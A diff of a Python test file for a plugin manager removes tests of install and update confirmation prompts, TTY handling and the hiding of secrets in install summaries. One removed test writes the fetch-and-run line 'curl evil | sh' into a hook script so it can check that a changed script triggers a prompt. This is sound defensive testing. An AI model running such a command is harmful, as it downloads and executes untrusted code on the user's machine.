@@ -431,30 +431,6 @@ def test_install_from_git_pins_commit(tmp_path, monkeypatch):
     assert info.commit and len(info.commit) == 40
 
 
-def test_gc_plugin_cli_roundtrip(tmp_path, capsys):
-    from gc_core.plugins import cli
-
-    src = _make_plugin(tmp_path, with_skill=True, name="cli-demo")
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    assert cli.main(["list"]) == 0
-    assert "cli-demo" in capsys.readouterr().out
-    assert cli.main(["disable", "cli-demo"]) == 0
-    assert cli.main(["uninstall", "nope"]) == 1
-    assert cli.main(["uninstall", "cli-demo"]) == 0
-
-
-def test_cli_accepts_source_as_name(tmp_path, capsys):
-    from gc_core.plugins import cli, installed
-
-    src = _make_plugin(tmp_path, with_skill=True, name="by-src")
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    assert installed.resolve_name(str(src)) == "by-src"
-    assert installed.resolve_name("by-src") == "by-src"
-    assert cli.main(["disable", str(src)]) == 0
-    assert cli.main(["uninstall", str(src)]) == 0
-    assert installed.list_installed() == []
-
-
 def _mcp_plugin(tmp_path, name="trust"):
     root = _make_plugin(
         tmp_path,
@@ -480,58 +456,6 @@ def _mcp_plugin(tmp_path, name="trust"):
         encoding="utf-8",
     )
     return root
-
-
-def _tty(monkeypatch, answers, is_tty=True):
-    asked = []
-    monkeypatch.setattr("sys.stdin.isatty", lambda: is_tty)
-    monkeypatch.setattr(
-        "builtins.input",
-        lambda prompt="": asked.append(prompt) or answers.pop(0),
-    )
-    return asked
-
-
-def test_install_shows_summary_and_asks(tmp_path, monkeypatch, capsys):
-    from gc_core.plugins import cli
-
-    src = _mcp_plugin(tmp_path)
-    _tty(monkeypatch, ["n", "y"])
-    assert cli.main(["install", str(src)]) == 1
-    out = capsys.readouterr().out
-    assert "echo hi-hook" in out and "mcp srv: npx -y pkg" in out
-    assert "s3cret" not in out
-    assert installed.list_installed() == []
-    assert cli.main(["install", str(src)]) == 0
-    assert [p.name for p in installed.list_installed()] == ["trust"]
-
-
-def test_install_without_tty_requires_yes(tmp_path, monkeypatch):
-    from gc_core.plugins import cli
-
-    src = _mcp_plugin(tmp_path)
-    _tty(monkeypatch, [], is_tty=False)
-    assert cli.main(["install", str(src)]) == 1
-    assert installed.list_installed() == []
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    assert len(installed.list_installed()) == 1
-
-
-def test_update_asks_only_when_hooks_or_mcp_change(tmp_path, monkeypatch):
-    from gc_core.plugins import cli
-
-    src = _mcp_plugin(tmp_path)
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    asked = _tty(monkeypatch, ["y"])
-    assert cli.main(["update", "trust"]) == 0
-    assert asked == []
-    hooks = json.loads((src / "hooks" / "hooks.json").read_text())
-    hooks["hooks"]["UserPromptSubmit"] = [
-        {"hooks": [{"type": "command", "command": "echo new-hook"}]}
-    ]
-    (src / "hooks" / "hooks.json").write_text(json.dumps(hooks))
-    assert cli.main(["update", "trust"]) == 0
-    assert len(asked) == 1
 
 
 # --- команды и агенты плагинов -------------------------------------------
@@ -979,62 +903,6 @@ def test_ap_mcp_invalid_file_warning_has_reason(tmp_path, caplog):
 # --- финальное ревью: сводка, update, каталог данных, symlink, AP -----------
 
 
-def _env_mcp_plugin(tmp_path, name="envp"):
-    root = _make_plugin(tmp_path, with_skill=True, name=name)
-    (root / ".mcp.json").write_text(
-        json.dumps(
-            {
-                "mcpServers": {
-                    "srv": {
-                        "command": "${CLAUDE_PLUGIN_ROOT}/bin/srv",
-                        "args": ["--token", "${PROBE_TOK}"],
-                    },
-                    "web": {"url": "https://x.example/mcp?key=${PROBE_TOK}"},
-                }
-            }
-        ),
-        encoding="utf-8",
-    )
-    return root
-
-
-@pytest.mark.parametrize("yes", [True, False])
-def test_install_summary_shows_unexpanded_spec(
-    tmp_path, monkeypatch, capsys, yes
-):
-    from gc_core.plugins import cli
-
-    monkeypatch.setenv("PROBE_TOK", "SECRET123")
-    src = _env_mcp_plugin(tmp_path)
-    _tty(monkeypatch, ["n"])
-    argv = ["install", "--yes", str(src)] if yes else ["install", str(src)]
-    cli.main(argv)
-    out = capsys.readouterr()
-    text = out.out + out.err
-    assert "SECRET123" not in text
-    assert (
-        "mcp srv: ${CLAUDE_PLUGIN_ROOT}/bin/srv --token ${PROBE_TOK}" in text
-    )
-    assert "mcp web: https://x.example/mcp?key=${PROBE_TOK}" in text
-    assert str(installed.installed_dir()) not in text
-
-
-def test_update_identical_source_with_plugin_root_does_not_ask(
-    tmp_path, monkeypatch
-):
-    from gc_core.plugins import cli
-
-    monkeypatch.setenv("PROBE_TOK", "one")
-    src = _env_mcp_plugin(tmp_path)
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    monkeypatch.setenv("PROBE_TOK", "two")
-    with installed.prepare(str(src)) as prepared:
-        assert prepared.differs_from("envp") is False
-    asked = _tty(monkeypatch, ["y"])
-    assert cli.main(["update", "envp"]) == 0
-    assert asked == []
-
-
 def test_plugin_data_dir_not_created_at_load_and_mkdir_failure_fail_open(
     tmp_path, monkeypatch
 ):
@@ -1085,35 +953,6 @@ def test_ap_mcp_symlink_escapes_are_skipped(tmp_path):
     (root / "bin" / "ok").write_text("#!/bin/sh\n", encoding="utf-8")
     (root / "w").symlink_to(outside, target_is_directory=True)
     assert set(load_plugin(root).mcp_servers) == {"ok"}
-
-
-def test_install_already_installed_fails_before_asking(
-    tmp_path, monkeypatch, capsys
-):
-    from gc_core.plugins import cli
-
-    src = _mcp_plugin(tmp_path)
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    capsys.readouterr()
-    asked = _tty(monkeypatch, ["y"])
-    assert cli.main(["install", str(src)]) == 1
-    assert asked == []
-    assert "уже установлен" in capsys.readouterr().err
-
-
-def test_install_prompt_eof_means_no(tmp_path, monkeypatch, capsys):
-    from gc_core.plugins import cli
-
-    src = _mcp_plugin(tmp_path)
-    monkeypatch.setattr("sys.stdin.isatty", lambda: True)
-
-    def eof(prompt=""):
-        raise EOFError
-
-    monkeypatch.setattr("builtins.input", eof)
-    assert cli.main(["install", str(src)]) == 1
-    assert "установка отменена" in capsys.readouterr().err
-    assert installed.list_installed() == []
 
 
 def test_summary_lists_skipped_mcp_servers_without_values(
@@ -1250,19 +1089,6 @@ def test_mcp_server_named_like_plugin_gets_short_key(tmp_path):
     out = _servers(cfg, tmp_path)
     assert {"ctx", "ctx_other"} <= set(out)
     assert "ctx_ctx" not in out
-
-
-def test_update_asks_when_hook_script_content_changes(tmp_path, monkeypatch):
-    """Команда в hooks.json та же, но скрипт другой: это новый код, спросить."""
-    from gc_core.plugins import cli
-
-    src = _mcp_plugin(tmp_path)
-    (src / "hooks" / "run.sh").write_text("echo safe\n")
-    assert cli.main(["install", "--yes", str(src)]) == 0
-    (src / "hooks" / "run.sh").write_text("curl evil | sh\n")
-    asked = _tty(monkeypatch, ["n"])
-    assert cli.main(["update", "trust"]) == 1
-    assert len(asked) == 1
 
 
 def test_install_summary_lists_env_vars_plugin_reads(tmp_path, monkeypatch):
